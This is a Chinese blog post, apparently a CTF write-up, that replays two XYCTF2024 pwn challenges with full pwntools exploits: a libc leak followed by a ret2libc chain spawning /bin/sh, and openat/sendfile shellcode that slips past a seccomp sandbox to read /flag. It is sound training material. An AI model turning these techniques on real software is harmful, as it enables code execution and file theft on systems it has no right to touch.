---
title: "XYCTF2024PWN复现"
description: '久违地找了个比赛复现'
date: "2026-10-11T14:35:25.270Z"
draft: false
sticky: false
heroImage: ''
showHeroImage: false
tags: [PWN,WP]
categories: [WP]
series: []
comments: true
sidebar:
  enable: true
  toc: true
  relatedPosts: true
---

# XYCTF2024 PWN 复现

> 复现中，先开个坑

[复现网址](https://gz.imxbt.cn/games/4/)

## hello_world(签到)

主函数如下

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
      char buf[32]; // [rsp+0h] [rbp-20h] BYREF

      init();
      printf("%s", "please input your name: ");
      read(0, buf, 0x48u);
      printf("Welcome to XYCTF! %s\n", buf);
      printf("%s", "please input your name: ");
      read(0, buf, 72u);
      printf("Welcome to XYCTF! %s\n", buf);
    return 0;
}
```

### 分析

通过 `%s` 第一次泄露 libc ，第二次 ret2libc 。

### EXP

```python
from pwn import *
context(arch = 'amd64',log_level = 'debug',terminal=['tmux','new-window'])

io = process('./vuln')
# gdb.attach(io)
io.sendlineafter(b"name: ",b'A'*40)
io.recvuntil(b'A'*40)
libc_base = u64(io.recv(6).ljust(8,b'\x00')) - 0x29d0a
log.info(f"libc -> {hex(libc_base)}")

libc = ELF('./libc.so.6')
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi= libc_base + 0x2a3e5
retn   = libc_base + 0x2a3e6

payload = flat(
    b'a'*40,
    p64(pop_rdi),
    p64(bin_sh),
    p64(retn),
    p64(system),
)

io.sendline(payload)

io.interactive()
```

## invisible_flag

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *addr; // [rsp+8h] [rbp-118h]

  init();
  addr = mmap((void *)0x114514000LL, 0x1000u, 7, 34, -1, 0);
  if ( addr == (void *)-1LL )
  {
    puts("ERROR");
    return 1;
  }
  else
  {
    puts("show your magic again");
    read(0, addr, 0x200u);
    sandbox();
    ((void (*)(void))addr)();
    return 0;
  }
}
```

### 分析

使用 `seccomp-tools dump ./vuln` 检查沙箱。

```bash
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x07 0x00 0x00000000  if (A == read) goto 0013
 0006: 0x15 0x06 0x00 0x00000001  if (A == write) goto 0013
 0007: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0013
 0008: 0x15 0x04 0x00 0x00000013  if (A == readv) goto 0013
 0009: 0x15 0x03 0x00 0x00000014  if (A == writev) goto 0013
 0010: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0013
 0011: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

想到的方式是使用 `openat` 打开文件返回文件描述符 `fd` ；再使用 `sendfile` 内核把 /flag 的内容直接拷到 stdout。

> ~~如何编写 shellcode~~

### EXP

```python
from pwn import *
context(arch = 'amd64',log_level = 'debug')

# sandbox: read write open readv writev execve execveat

# openat(AT_FDCWD, "/flag", O_RDONLY);
# sendfile(1, fd, NULL, 0x100);

shellcode = """
    mov rbx, 0x67616c662f ;
    push rbx;
    mov rsi, rsp;
    mov rdi,0xffffffffffffff9c; 
    xor rdx, rdx;
    mov rax, 257;
    syscall;

    mov rdi, 1;
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x100
    mov rax, 40
    syscall

    mov rax, 0x3C;
    xor rdi, rdi;
    syscall;
"""
shellcode=asm(shellcode)

# io = process('./vuln')
io = remote("challenge.imxbt.cn",32236)

sc="""break *$rebase(0x143B)
c
"""

# gdb.attach(io,sc)
io.recvuntil(b'again')
io.send(shellcode)


io.interactive()

```

## fmt

